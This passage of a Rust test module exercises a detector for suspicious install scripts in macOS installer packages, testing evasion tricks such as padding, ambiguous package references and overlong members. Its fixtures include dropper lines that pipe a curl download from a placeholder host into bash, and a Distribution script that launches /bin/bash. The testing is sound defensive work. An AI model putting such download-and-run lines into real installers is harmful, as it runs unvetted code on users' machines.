        (0..n)
            .map(|i| {
                let name = if i % 2 == 0 {
                    "Distribution"
                } else {
                    "Scripts"
                };
                nested("pad", file(name, (base + i, WINDOW)))
            })
            .collect()
    }

    /// A product archive: `dists` (raw bytes, TOC order), then each `(dir, member)`
    /// component with a dropper `Scripts`, then `pads` padding entries.
    fn product_with(dists: &[Vec<u8>], comps: &[(&str, &str)], pads: usize) -> Vec<u8> {
        let mut heap = Heap::default();
        let mut toc = String::new();
        for d in dists {
            toc += &file("Distribution", heap.add(d));
        }
        for (path, member) in comps {
            let range = heap.add(&scripts_blob(member));
            toc += &nested(path, file("Scripts", range));
        }
        toc += &padding(&mut heap, pads);
        archive(&toc, &heap)
    }

    fn product(refs: &[&str], comps: &[(&str, &str)], pads: usize) -> Vec<u8> {
        product_with(&[distribution_xml(refs)], comps, pads)
    }

    fn padding_limits() -> xar::XarLimits {
        xar::XarLimits {
            max_entry_bytes: 4096,
            max_read_back_bytes: 16 * 1024,
            ..xar::XarLimits::default()
        }
    }

    /// Enough padding that an equal share of the budget is below one `Scripts`.
    fn starving_padding(limits: &xar::XarLimits) -> usize {
        let n = 6 * limits.max_read_back_bytes / scripts_blob("preinstall").len();
        assert!(n < limits.max_entries);
        n
    }

    /// The finding's description (`None` for exactly `Err(NotApplicable)`) and
    /// whether a gap was marked. Panics on a clean `Ok(None)`: these archives
    /// always hold either a finding or something unread.
    fn found(bytes: &[u8], limits: &xar::XarLimits) -> (Option<String>, bool) {
        let (r, c) = evaluate_small(bytes, limits);
        let description = match r {
            Ok(Some(signal)) => Some(signal.description),
            Err(RuleOutcome::NotApplicable) => None,
            other => panic!("{other:?}"),
        };
        (
            description,
            c.marked_incomplete("installer-script-suspicious"),
        )
    }

    #[test]
    fn padding_cannot_starve_a_referenced_scripts() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [("comp.pkg", "preinstall")];

        let (d, incomplete) = found(&product(&["#comp.pkg"], &comps, pads), &limits);
        assert!(d.expect("scores").contains("install script preinstall"));
        assert!(incomplete);

        // Unreferenced, the same entry is starved.
        let (d, _) = found(&product(&[], &comps, pads), &limits);
        assert_eq!(d, None);
        let (d, _) = found(&product(&[], &comps, 0), &limits);
        assert!(d.is_some());
    }

    #[test]
    fn only_the_first_top_level_distribution_names_components() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [("a.pkg", "preinstall"), ("b.pkg", "postinstall")];
        let dists = [distribution_xml(&["#a.pkg"]), distribution_xml(&["#b.pkg"])];

        let (d, incomplete) = found(&product_with(&dists, &comps, pads), &limits);
        let d = d.expect("scores");
        assert!(d.contains("install script preinstall"), "{d}");
        assert!(!d.contains("postinstall"), "{d}");
        assert!(incomplete);

        let (d, _) = found(&product_with(&dists, &comps, 0), &limits);
        let d = d.expect("scores");
        assert!(d.contains("preinstall") && d.contains("postinstall"), "{d}");
    }

    #[test]
    fn a_second_distribution_is_still_scanned() {
        let launch = br#"<a><script>system.run("/bin/bash", "-c", "x");</script></a>"#;
        let dists = [distribution_xml(&[]), launch.to_vec()];
        let bytes = product_with(&dists, &[], 0);
        let (d, incomplete) = found(&bytes, &padding_limits());
        assert!(d.expect("scores").contains("launches an interpreter"));
        assert!(!incomplete);
    }

    #[test]
    fn an_unreferenced_component_is_still_scored() {
        let comps = [("a.pkg", "preinstall"), ("b.pkg", "postinstall")];
        let bytes = product(&["#a.pkg"], &comps, 0);
        let (d, _) = found(&bytes, &padding_limits());
        let d = d.expect("scores");
        assert!(d.contains("preinstall") && d.contains("postinstall"), "{d}");
    }

    #[test]
    fn an_unreadable_distribution_names_no_components() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [("comp.pkg", "preinstall")];

        let mut over_cap = distribution_xml(&["#comp.pkg"]);
        over_cap.resize(limits.max_entry_bytes + 100, b' ');
        for dist in [b"<a><b".to_vec(), over_cap] {
            let dists = [dist];
            let (d, incomplete) = found(&product_with(&dists, &comps, 0), &limits);
            assert!(d.is_some() && incomplete);
            // Unread, but any Scripts may run: its starving is reported.
            let (d, _) = found(&product_with(&dists, &comps, pads), &limits);
            assert!(d.expect("starved").starts_with(STARVED));
        }

        // Out of the heap: no cost, no read.
        let mut heap = Heap::default();
        let range = heap.add(&scripts_blob("preinstall"));
        let toc = format!(
            "{}{}{}",
            file("Distribution", (heap.0.len() + 1000, 50)),
            nested("comp.pkg", file("Scripts", range)),
            padding(&mut heap, pads)
        );
        let (d, _) = found(&archive(&toc, &heap), &limits);
        assert!(d.expect("starved").starts_with(STARVED));
    }

    #[test]
    fn a_flat_package_reads_its_first_top_level_scripts_first() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [("", "preinstall"), ("", "postinstall")];

        let (d, incomplete) = found(&product_with(&[], &comps, pads), &limits);
        let d = d.expect("scores");
        assert!(d.contains("install script preinstall"), "{d}");
        assert!(!d.contains("postinstall"), "{d}");
        assert!(incomplete);

        let (d, _) = found(&product_with(&[], &comps, 0), &limits);
        assert!(d.expect("scores").contains("postinstall"));
    }

    /// `pkg_ref_paths` over `doc`, resolving every path to itself as an index
    /// into `names`; `None` is the whole-set distrust result.
    fn refs_of(doc: &[u8], names: &[&str]) -> Option<Vec<String>> {
        let resolve = |p: &str| names.iter().position(|n| *n == p);
        let query = RefQuery {
            max: names.len(),
            resolve: &resolve,
        };
        let idx = pkg_ref_paths(doc, &query)?;
        Some(idx.into_iter().map(|i| names[i].to_string()).collect())
    }

    fn one_ref(text: &str) -> Vec<u8> {
        format!(r#"<installer-gui-script><pkg-ref id="a">{text}</pkg-ref></installer-gui-script>"#)
            .into_bytes()
    }

    #[test]
    fn script_bodies_are_not_scanned_for_pkg_refs() {
        let names = ["a.pkg", "b.pkg"];
        let doc = b"<g><script>if (a < b) x = '<pkg-ref>#b.pkg</pkg-ref>';</script>\
            <pkg-ref>#a.pkg</pkg-ref></g>";
        assert_eq!(refs_of(doc, &names).expect("trusted"), ["a.pkg"]);
        assert_eq!(refs_of(b"<g><script>x", &names), None);
    }

    #[test]
    fn pkg_refs_are_decoded_and_filtered() {
        let doc = br#"<installer-gui-script>
            <pkg-ref id="a">#my%20comp.pkg</pkg-ref>
            <pkg-ref id="b">
               &#35;sub/b&amp;c.pkg
            </pkg-ref>
            <pkg-ref id="c">#c.pkg</pkg-ref>
            <pkg-ref id="d">file:///tmp/x.pkg</pkg-ref>
            <pkg-ref id="e">/abs/e.pkg</pkg-ref>
            <pkg-ref id="f">f.pkg</pkg-ref>
            <pkg-ref id="g"/>
            <pkg-ref id="i">#my comp.pkg</pkg-ref>
            <pkg-ref id="j">#unknown.pkg</pkg-ref>
        </installer-gui-script>"#;
        let names = ["my comp.pkg", "sub/b&c.pkg", "c.pkg", "f.pkg", "x.pkg"];
        assert_eq!(
            refs_of(doc, &names).expect("trusted"),
            ["my comp.pkg", "sub/b&c.pkg", "c.pkg"]
        );
        let capped = RefQuery {
            max: 2,
            resolve: &|p| names.iter().position(|n| *n == p),
        };
        assert_eq!(pkg_ref_paths(doc, &capped).expect("trusted").len(), 2);
    }

    #[test]
    fn ambiguous_pkg_refs_distrust_the_whole_set() {
        let names = ["a.pkg", "b.pkg", "é.pkg", ".pkg", "a/b.pkg"];
        assert!(refs_of(&one_ref("#a.pkg"), &names).is_some());
        let ambiguous: Vec<Vec<u8>> = vec![
            one_ref("<![CDATA[#a.pkg]]>"),
            one_ref("#a<![CDATA[]]>.pkg"),
            one_ref("#<b/>a.pkg"),
            one_ref("#a.pkg<!-- c --><x>y</x>"),
            one_ref("#é.pkg"),
            one_ref("\u{a0}#a.pkg"),
            one_ref("&#233;.pkg"),
            one_ref("#&#xa0;a.pkg"),
            one_ref("#a.pkg&#0;"),
            one_ref("#a\x0b.pkg"),
            one_ref("#a&#9;.pkg"),
            one_ref("#"),
            one_ref("#/a.pkg"),
            one_ref("#a.pkg/"),
            one_ref("#a//b.pkg"),
            one_ref("#./a.pkg"),
            one_ref("#a/../b.pkg"),
            one_ref("#a/./b.pkg"),
            one_ref("#a%2Fb.pkg"),
            one_ref("#a%00.pkg"),
            one_ref("#%C3%A9.pkg"),
            one_ref("#%2e%2e/a.pkg"),
            one_ref("#a%0A.pkg"),
            one_ref("#&e;"),
            one_ref("#cd%zz.pkg"),
            one_ref("#a.pkg%4"),
            one_ref("#a&#00000000000000000000000000000047;b.pkg"),
            one_ref("#a&b.pkg"),
            b"<installer-gui-script><pkg-ref id=\"a\">#a.pkg".to_vec(),
        ];
        for doc in &ambiguous {
            let shown = String::from_utf8_lossy(doc);
            assert_eq!(refs_of(doc, &names), None, "{shown}");
        }
        // One ambiguous reference among good ones still voids the set.
        let mixed = b"<g><pkg-ref>#a.pkg</pkg-ref><pkg-ref>#b/../c</pkg-ref></g>";
        assert_eq!(refs_of(mixed, &names), None);
        // A Latin-1 byte in a reference.
        let latin1 = b"<g><pkg-ref>#caf\xe9.pkg</pkg-ref></g>";
        assert_eq!(refs_of(latin1, &names), None);
    }

    #[test]
    fn an_ambiguous_reference_leaves_every_scripts_in_the_low_priority_group() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [("a.pkg", "preinstall")];
        let (d, _) = found(&product(&["#a.pkg"], &comps, pads), &limits);
        assert!(d.is_some());
        let (d, _) = found(&product(&["#a.pkg", "#x/../y"], &comps, pads), &limits);
        assert!(d.expect("starved").starts_with(STARVED));
    }

    #[test]
    fn encoded_pkg_refs_resolve_to_components() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [
            ("my comp.pkg", "pre1"),
            ("sub/b&c.pkg", "pre2"),
            ("plain.pkg", "pre3"),
            ("x.pkg", "pre4"),
        ];
        let refs = [
            "#my%20comp.pkg",
            " &#35;sub/b&amp;c.pkg\n",
            "plain.pkg",
            "file:///x.pkg",
        ];
        let (d, _) = found(&product(&refs, &comps, pads), &limits);
        let d = d.expect("scores");
        assert!(d.contains("pre1") && d.contains("pre2"), "{d}");
        assert!(!d.contains("pre3") && !d.contains("pre4"), "{d}");
    }

    #[test]
    fn a_repeated_heap_range_is_read_once() {
        let limits = small_limits();
        let mut heap = Heap::default();
        let range = heap.add(&distribution_xml(&[]));
        let toc = file("Distribution", range).repeat(300);
        assert!(matches!(
            evaluate_small(&archive(&toc, &heap), &limits).0,
            Ok(None)
        ));

        let launch = br#"<a><script>system.run("/bin/bash", "-c", "x");</script></a>"#;
        let mut heap = Heap::default();
        let range = heap.add(launch);
        let once = archive(&file("Distribution", range), &heap);
        let many = archive(&file("Distribution", range).repeat(300), &heap);
        let (once, _) = evaluate_small(&once, &limits);
        let (many, c) = evaluate_small(&many, &limits);
        let (once, many) = (once.unwrap().unwrap(), many.unwrap().unwrap());
        assert_eq!(
            (once.weight, once.description),
            (many.weight, many.description)
        );
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn findings_follow_toc_order_not_read_order() {
        let launch = br##"<a><pkg-ref id="x">#a.pkg</pkg-ref><script>system.run("/bin/bash", "-c", "x");</script></a>"##;
        let mut heap = Heap::default();
        let mut toc = nested(
            "z.pkg",
            file("Scripts", heap.add(&scripts_blob("postinstall"))),
        );
        toc += &file("Distribution", heap.add(launch));
        toc += &nested(
            "a.pkg",
            file("Scripts", heap.add(&scripts_blob("preinstall"))),
        );

        let (d, _) = found(&archive(&toc, &heap), &padding_limits());
        let d = d.expect("scores");
        let at = |needle: &str| d.find(needle).unwrap_or_else(|| panic!("{needle}: {d}"));
        assert!(at("postinstall") < at("distribution script"));
        assert!(at("distribution script") < at("install script preinstall"));
    }

    #[test]
    fn a_directory_named_distribution_is_not_the_distribution() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let mut heap = Heap::default();
        let mut toc = String::from("<file><name>Distribution</name><type>directory</type></file>");
        for member in ["preinstall", "postinstall"] {
            toc += &file("Scripts", heap.add(&scripts_blob(member)));
        }
        toc += &padding(&mut heap, pads);
        let (d, _) = found(&archive(&toc, &heap), &limits);
        let d = d.expect("scores");
        assert!(
            d.contains("preinstall") && !d.contains("postinstall"),
            "{d}"
        );
    }

    /// A `Distribution` with `outline` as its `<choices-outline>` body (none if
    /// `None`), then `rest`.
    fn wired(outline: Option<&str>, rest: &str) -> Vec<u8> {
        let outline = outline.map_or(String::new(), |o| {
            format!("<choices-outline>{o}</choices-outline>")
        });
        format!("<installer-gui-script>{outline}{rest}</installer-gui-script>").into_bytes()
    }

    #[test]
    fn only_references_reachable_from_the_outline_are_kept() {
        let names = ["a.pkg", "b.pkg", "c.pkg", "d.pkg", "e.pkg"];
        let rest = r##"
            <choice id="ca"><pkg-ref id="a"/></choice>
            <choice id="cc"><pkg-ref id="c"/></choice>
            <choice id="cd" selected="false"><pkg-ref id="d"/></choice>
            <choice id="ce"><pkg-ref id="e">#e.pkg</pkg-ref></choice>
            <pkg-ref id="a">#a.pkg</pkg-ref>
            <pkg-ref id="b">#b.pkg</pkg-ref>
            <pkg-ref id="c">#c.pkg</pkg-ref>
            <pkg-ref id="d">#d.pkg</pkg-ref>
            <pkg-ref>#a.pkg</pkg-ref>"##;
        // b has no choice, c's choice is not in the outline; d's choice is
        // reached through a nested line and counts as selected.
        let outline = r#"<line choice="ca"><line choice="cd"/></line><line choice="ce"/>"#;
        let doc = wired(Some(outline), rest);
        assert_eq!(
            refs_of(&doc, &names).expect("trusted"),
            ["e.pkg", "a.pkg", "d.pkg"]
        );
        // An outline that reaches nothing keeps nothing.
        let none = wired(Some(r#"<line choice="nope"/>"#), rest);
        assert_eq!(refs_of(&none, &names), Some(vec![]));
        // `<!` in a comment or CDATA is not a declaration.
        let quoted = [
            b"<!-- <!DOCTYPE x> -->".as_slice(),
            &none,
            b"<![CDATA[ a<!b ]]>",
        ]
        .concat();
        assert_eq!(refs_of(&quoted, &names), Some(vec![]));
        // Ids compare case-folded.
        let folded = wired(
            Some(r#"<line choice="CA"/>"#),
            r##"<choice id="ca"><pkg-ref id="A"/></choice><pkg-ref id="a">#a.pkg</pkg-ref>"##,
        );
        assert_eq!(refs_of(&folded, &names).expect("trusted"), ["a.pkg"]);
    }

    #[test]
    fn unclear_choice_structure_keeps_every_reference() {
        let names = ["a.pkg", "b.pkg"];
        let refs = r##"<pkg-ref id="a">#a.pkg</pkg-ref><pkg-ref id="b">#b.pkg</pkg-ref>"##;
        let choice = r#"<choice id="ca"><pkg-ref id="a"/></choice>"#;
        let line = r#"<line choice="ca"/>"#;
        let filtered = wired(Some(line), &format!("{choice}{refs}"));
        assert_eq!(refs_of(&filtered, &names).expect("trusted"), ["a.pkg"]);

        let unclear = [
            // No outline: not measured.
            wired(None, &format!("{choice}{refs}")),
            // An outline that is not a child of the root.
            wired(
                None,
                &format!("<x><choices-outline>{line}</choices-outline></x>{choice}{refs}"),
            ),
            // Names or attributes in another case.
            wired(Some(r#"<Line choice="ca"/>"#), &format!("{choice}{refs}")),
            wired(Some(r#"<line Choice="ca"/>"#), &format!("{choice}{refs}")),
            wired(
                Some(line),
                &format!(r#"<choice ID="ca"><pkg-ref id="a"/></choice>{refs}"#),
            ),
            // A repeated attribute, an entity, a space or an empty value.
            wired(
                Some(r#"<line choice="ca" choice="cb"/>"#),
                &format!("{choice}{refs}"),
            ),
            wired(
                Some(r#"<line choice="c&#97;"/>"#),
                &format!("{choice}{refs}"),
            ),
            wired(
                Some(line),
                &format!(r#"<choice id="ca"><pkg-ref id=" a"/></choice>{refs}"#),
            ),
            wired(
                Some(line),
                &format!(r#"<choice id="ca"><pkg-ref id=""/></choice>{refs}"#),
            ),
            // A pkg-ref in a choice with no id, one with no id in a choice,
            // a nested choice, and mismatched nesting.
            wired(
                Some(line),
                &format!(r#"{choice}<choice><pkg-ref id="b"/></choice>{refs}"#),
            ),
            wired(
                Some(line),
                &format!(r#"{choice}<choice id="cb"><pkg-ref/></choice>{refs}"#),
            ),
            wired(
                Some(line),
                &format!(
                    r#"<choice id="ca"><choice id="cb"><pkg-ref id="a"/></choice></choice>{refs}"#
                ),
            ),
            wired(Some(line), &format!("<x>{choice}</y>{refs}")),
            // A prefixed attribute, a wiring tag in a script body.
            wired(Some(r#"<line x:choice="cb"/>"#), &format!("{choice}{refs}")),
            wired(
                Some(line),
                &format!(r#"{choice}<script>var s = '<choice id="cb">';</script>{refs}"#),
            ),
            // One id naming two paths.
            wired(
                Some(line),
                &format!(r##"{choice}{refs}<pkg-ref id="a">#b.pkg</pkg-ref>"##),
            ),
            // An outline with no line, a prefixed name, a DOCTYPE.
            wired(Some(""), &format!("{choice}{refs}")),
            wired(Some(r#"<x:line choice="cb"/>"#), &format!("{choice}{refs}")),
            [
                b"<!DOCTYPE g [<!ATTLIST line choice CDATA 'cb'>]>".as_slice(),
                &wired(Some(line), &format!("{choice}{refs}")),
            ]
            .concat(),
        ];
        for doc in &unclear {
            let shown = String::from_utf8_lossy(doc);
            assert_eq!(
                refs_of(doc, &names).expect("trusted"),
                ["a.pkg", "b.pkg"],
                "{shown}"
            );
        }
    }

    #[test]
    fn metadata_children_do_not_void_the_reference_set() {
        let names = ["a.pkg", "b.pkg"];
        // productbuild's shape: one pkg-ref with the path, one with metadata.
        let doc = br##"<g><pkg-ref id="a">#a.pkg</pkg-ref>
            <pkg-ref id="a"><bundle-version><bundle id="x" path="A.app"/></bundle-version></pkg-ref>
            <pkg-ref id="b">
                <bundle-version/>
            </pkg-ref></g>"##;
        assert_eq!(refs_of(doc, &names).expect("trusted"), ["a.pkg"]);
        let bad: [&[u8]; 6] = [
            b"<g><pkg-ref>#a.pkg<bundle-version/></pkg-ref></g>",
            b"<g><pkg-ref><x>#a.pkg</x></pkg-ref></g>",
            b"<g><pkg-ref><x><y></x></y></pkg-ref></g>",
            b"<g><pkg-ref><x:Pkg-Ref/></pkg-ref></g>",
            b"<g><pkg-ref><line choice='c'/></pkg-ref></g>",
            b"<g><pkg-ref><script>x</script></pkg-ref></g>",
        ];
        for doc in bad {
            assert_eq!(
                refs_of(doc, &names),
                None,
                "{}",
                String::from_utf8_lossy(doc)
            );
        }
    }

    /// The fixture's `Distribution` (stored uncompressed) wires only `updater.pkg`.
    #[test]
    fn the_unreachable_component_fixture_keeps_one_reference() {
        let pkg =
            include_bytes!("../../fixtures/suspicious/installer_choices_unreachable_component.pkg");
        let start = xml::find(pkg, b"<?xml").expect("Distribution");
        let close = b"</installer-gui-script>";
        let len = xml::find(&pkg[start..], close).expect("end") + close.len();
        let names = ["updater.pkg", "extras.pkg"];
        assert_eq!(
            refs_of(&pkg[start..start + len], &names).expect("trusted"),
            ["updater.pkg"]
        );
    }

    #[test]
    fn a_processing_instruction_cannot_hide_a_line() {
        let names = ["a.pkg", "b.pkg"];
        let outline = r#"<?pi > </choices-outline><choices-outline><z a='?><line choice="ca"/>'/>"#;
        let rest = r##"<choice id="ca"><pkg-ref id="a"/></choice>
            <pkg-ref id="a">#a.pkg</pkg-ref><pkg-ref id="b">#b.pkg</pkg-ref>"##;
        let doc = wired(Some(outline), rest);
        assert_eq!(refs_of(&doc, &names).expect("trusted"), ["a.pkg"]);
    }

    #[test]
    fn unreachable_padding_components_cannot_starve_a_reachable_one() {
        let limits = padding_limits();
        let mut heap = Heap::default();
        let benign = b"#!/bin/sh\nexit 0\n".repeat(60);
        let dropper = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n";
        // The dropper sits behind a benign member, so a cut read misses it.
        let mut cpio = odc_member("postinstall", &benign);
        cpio.extend(odc_member("preinstall", dropper));
        cpio.extend(odc_member("TRAILER!!!", b""));
        let real = heap.add(&zlib_stored(&gzip_stored(&cpio)));
        let mut cpio = odc_member("preinstall", &benign);
        cpio.extend(odc_member("TRAILER!!!", b""));
        let pad = zlib_stored(&gzip_stored(&cpio));
        let pads = 12;
        let doc = |outline: &str| {
            let mut refs = r##"<pkg-ref id="r">#r.pkg</pkg-ref>"##.to_string();
            let mut choices = r#"<choice id="cr"><pkg-ref id="r"/></choice>"#.to_string();
            for i in 0..pads {
                refs += &format!(r##"<pkg-ref id="p{i}">#p{i}.pkg</pkg-ref>"##);
                choices += &format!(r#"<choice id="c{i}"><pkg-ref id="p{i}"/></choice>"#);
            }
            wired(Some(outline), &format!("{choices}{refs}"))
        };
        let build = |dist: Vec<u8>| {
            let mut heap = Heap(heap.0.clone());
            let mut toc = file("Distribution", heap.add(&dist));
            toc += &nested("r.pkg", file("Scripts", real));
            for i in 0..pads {
                toc += &nested(&format!("p{i}.pkg"), file("Scripts", heap.add(&pad)));
            }
            archive(&toc, &heap)
        };

        let (d, incomplete) = found(&build(doc(r#"<line choice="cr"/>"#)), &limits);
        assert!(d.expect("scores").contains("install script preinstall"));
        assert!(incomplete);

        // Reachable padding still starves it, which is itself reported (#112).
        let all: String = std::iter::once("cr".to_string())
            .chain((0..pads).map(|i| format!("c{i}")))
            .map(|c| format!(r#"<line choice="{c}"/>"#))
            .collect();
        let (d, incomplete) = found(&build(doc(&all)), &limits);
        let d = d.expect("starved");
        assert_eq!(
            d,
            "scripts Installer runs exceed the read budget (13 components)"
        );
        assert!(incomplete);
    }

    /// A zlib-over-gzip `Scripts` whose one member is `body_len` bytes of a
    /// benign script.
    fn benign_scripts(body_len: usize) -> Vec<u8> {
        let mut body = b"#!/bin/sh\n".to_vec();
        body.resize(body_len, b'\n');
        let mut cpio = odc_member("preinstall", &body);
        cpio.extend(odc_member("TRAILER!!!", b""));
        zlib_stored(&gzip_member(&cpio))
    }

    /// A `Scripts` blob (a stored gzip) of a cpio of `members`.
    fn scripts_of(members: &[(&str, &[u8])]) -> Vec<u8> {
        let moded: Vec<_> = members.iter().map(|(n, b)| (*n, *b, 0o100644)).collect();
        scripts_of_modes(&moded)
    }

    /// [`scripts_of`] with each member's mode.
    fn scripts_of_modes(members: &[(&str, &[u8], u32)]) -> Vec<u8> {
        let mut cpio = Vec::new();
        for (name, body, mode) in members {
            cpio.extend(odc_member_mode(name, body, *mode));
        }
        cpio.extend(odc_member("TRAILER!!!", b""));
        gzip_member(&cpio)
    }

    /// A flat package whose one `Scripts` holds `members`, under a 4 KiB
    /// per-member cap: its signal and whether it was marked incomplete.
    fn flat_scripts(members: &[(&str, &[u8])]) -> (Option<MatchedSignal>, bool) {
        flat_scripts_blob(&scripts_of(members))
    }

    /// [`flat_scripts`] over a `Scripts` blob. `NotApplicable` is no signal
    /// and incomplete.
    fn flat_scripts_blob(blob: &[u8]) -> (Option<MatchedSignal>, bool) {
        let limits = xar::XarLimits {
            max_entry_bytes: 4096,
            ..xar::XarLimits::default()
        };
        let mut heap = Heap::default();
        let toc = file("Scripts", heap.add(blob));
        let (r, c) = evaluate_small(&archive(&toc, &heap), &limits);
        match r {
            Ok(signal) => (signal, c.marked_incomplete("installer-script-suspicious")),
            Err(_) => (None, true),
        }
    }

    /// A script behind a member longer than the cap is still read (#123): the
    /// long member is scanned up to the cap, which leaves the scan `Partial`.
    #[test]
    fn a_script_behind_a_member_over_the_cap_is_found() {
        let pad = vec![b'x'; 6000];
        let (signal, incomplete) = flat_scripts(&[
            ("installer_telemetry", &pad),
            ("preinstall", SCRIPT_DROPPER),
        ]);
        let d = signal.expect("finding").description;
        assert!(d.contains("install script preinstall:"), "{d}");
        assert!(!d.contains(STARVED), "{d}");
        assert!(incomplete);
    }

    /// Members each within the cap may total more than it: all are read in
    /// full and the scan is complete.
    #[test]
    fn members_within_the_cap_are_read_whatever_their_total() {
        let pad = vec![b'x'; 3000];
        let (signal, incomplete) = flat_scripts(&[
            ("a.bin", &pad),
            ("b.bin", &pad),
            ("preinstall", SCRIPT_DROPPER),
        ]);
        let d = signal.expect("finding").description;
        assert!(d.contains("install script preinstall:"), "{d}");
        assert!(!incomplete);

        let (signal, incomplete) = flat_scripts(&[
            ("a.bin", &pad),
            ("b.bin", &pad),
            ("postinstall", b"#!/bin/sh\nexit 0\n"),
        ]);
        assert!(signal.is_none(), "{signal:?}");
        assert!(!incomplete);
    }

    /// A script longer than the cap is scanned up to it and reported.
    #[test]
    fn a_script_over_the_cap_is_scanned_up_to_it_and_reported() {
        let mut script = SCRIPT_DROPPER.to_vec();
        script.resize(6000, b'\n');
        let (signal, incomplete) = flat_scripts(&[("./postinstall", &script)]);
        let d = signal.expect("finding").description;
        assert!(
            d.contains("install script ./postinstall (cut short):"),
            "{d}"
        );
        assert!(d.contains(&format!("{STARVED} (1 component)")), "{d}");
        assert!(incomplete);
    }

    /// A top-level script name in another case (APFS's, long s included),
    /// after `./`, or cut at a NUL is still a script when it runs over the
    /// cap; one in a directory is not.
    #[test]
    fn an_overlong_script_is_recognised_by_its_normalised_name() {
        let mut body = b"#".repeat(6000);
        body.extend_from_slice(SCRIPT_DROPPER);
        for name in [
            "PreInstall",
            "././POSTFLIGHT",
            "postinstall\0.orig",
            "preinſtall",
            "./POSTINſTALL",
        ] {
            let (signal, incomplete) = flat_scripts(&[(name, &body)]);
            let d = signal.unwrap_or_else(|| panic!("{name}")).description;
            assert!(
                d.contains(&format!("{STARVED} (1 component)")),
                "{name}: {d}"
            );
            assert!(incomplete, "{name}");
        }
        // Not a script name: unreadable, not reported.
        for name in ["preinstall.txt", "./scripts/preinstall", "d/POSTFLIGHT"] {
            let (signal, incomplete) = flat_scripts(&[(name, &body)]);
            assert!(signal.is_none(), "{name}: {signal:?}");
            assert!(incomplete, "{name}");
        }
    }

    /// A member of file type 0 is extracted as a regular file and scanned; a
    /// script-named member of another type is scanned too.
    #[test]
    fn type_zero_and_special_script_members_are_scanned() {
        for mode in [0o000755, 0o010644, 0o140755] {
            let blob = scripts_of_modes(&[("./preinstall", SCRIPT_DROPPER, mode)]);
            let (signal, incomplete) = flat_scripts_blob(&blob);
            let d = signal.unwrap_or_else(|| panic!("{mode:o}")).description;
            assert!(d.contains("install script ./preinstall:"), "{mode:o}: {d}");
            assert!(!incomplete, "{mode:o}");
        }
        let blob = scripts_of_modes(&[("./helper.sh", SCRIPT_DROPPER, 0o000644)]);
        let (signal, _) = flat_scripts_blob(&blob);
        assert!(signal.is_some());
    }

    /// Later gzip members from the held gzip and from the entry's own stream
    /// are walked as separate cpio archives, each scanned.
    #[test]
    fn each_source_of_later_members_is_walked() {
        let benign = [
            odc_member("./a", b"echo hi\n"),
            odc_member("TRAILER!!!", b""),
        ]
        .concat();
        let dropper = [
            odc_member("./preinstall", SCRIPT_DROPPER),
            odc_member("TRAILER!!!", b""),
        ]
        .concat();
        let held = [gzip_member(&benign), gzip_member(&benign)].concat();
        let blob = [gzip_member(&held), gzip_member(&dropper)].concat();
        let (signal, _) = flat_scripts_blob(&blob);
        let d = signal.expect("finding").description;
        assert!(d.contains(LATER_MEMBER_NOTE), "{d}");
    }

    /// Later members have their own scan total: filler there does not starve
    /// a cut-short member of the first.
    #[test]
    fn later_filler_does_not_starve_the_first_member() {
        let mut first = odc_member("./helper.sh", SCRIPT_DROPPER);
        // Declare a longer body than is there, so the member is cut short.
        let declared = format!("{:011o}", SCRIPT_DROPPER.len() + 100);
        first[65..76].copy_from_slice(declared.as_bytes());
        let pad = vec![b'x'; 4096];
        let mut filler = Vec::new();
        for name in ["a", "b", "c", "d", "e"] {
            filler.extend(odc_member(name, &pad));
        }
        filler.extend(odc_member("TRAILER!!!", b""));
        let blob = [gzip_member(&first), gzip_member(&filler)].concat();
        let (signal, incomplete) = flat_scripts_blob(&blob);
        let d = signal.expect("finding").description;
        assert!(d.contains("install script ./helper.sh (cut short):"), "{d}");
        assert!(incomplete);
    }

    /// A script name that is a link, another non-regular member, or empty (an
    /// odc hard link) may run any over-cap member, so that is reported.
    #[test]
    fn a_script_linked_to_an_overlong_member_is_reported() {
        let mut body = b"#".repeat(6000);
        body.extend_from_slice(SCRIPT_DROPPER);
        let big = ("payload.sh", &body[..], 0o100755);
        for script in [
            ("preinstall", &b"payload.sh"[..], 0o120755),
            ("preinstall", &b""[..], 0o100755),
            ("PostInstall", &b""[..], 0o060644),
        ] {
            let (signal, incomplete) = flat_scripts_blob(&scripts_of_modes(&[big, script]));
            let d = signal.expect("finding").description;
            assert!(d.contains(STARVED), "{script:?}: {d}");
            assert!(incomplete, "{script:?}");
        }
    }

    /// Past the entry's scan total, members other than scripts are walked but
    /// not scanned, leaving the scan `Partial`; scripts are still scanned.
    #[test]
    fn members_past_the_scan_total_are_skipped_but_scripts_are_not() {
        // Four members at the cap use the whole 16 KiB total; the fifth is skipped.
        let pad = vec![b'x'; 4096];
        let mut members: Vec<(&str, &[u8])> = Vec::new();
        let names = ["a.bin", "b.bin", "c.bin", "d.bin", "e.bin"];
        for name in names {
            members.push((name, &pad));
        }
        members.push(("preinstall", SCRIPT_DROPPER));
        let (signal, incomplete) = flat_scripts(&members);
        let d = signal.expect("finding").description;
        assert!(d.contains("install script preinstall:"), "{d}");
        assert!(!d.contains(STARVED), "{d}");
        assert!(incomplete);

        // Only a top-level script is exempt from the total.
        for name in ["helper.sh", "d/preinstall"] {
            members.pop();
            members.push((name, SCRIPT_DROPPER));
            let (signal, incomplete) = flat_scripts(&members);
            assert!(signal.is_none(), "{name}: {signal:?}");
            assert!(incomplete);
        }
    }

    /// A body cut at the cap is scanned as a prefix: a pattern that would end
    /// exactly at the cut (`| sh` of `| shasum`) does not match.
    #[test]
    fn a_body_cut_at_the_cap_is_scanned_as_a_prefix() {
        let tail = b"\ncurl -fsSL https://example.invalid/a | sh";
        let mut body = b"#".repeat(4096 - tail.len());
        body.extend_from_slice(tail);
        body.extend_from_slice(b"asum\n");
        let (signal, incomplete) = flat_scripts(&[("checksum.txt", &body)]);
        let d = signal.map(|s| s.description).unwrap_or_default();
        assert!(!d.contains("piped to a shell"), "{d}");
        assert!(incomplete);
    }

    /// A gzip held for the nested decode past four times the entry cap is
    /// cut there and reported.
    #[test]
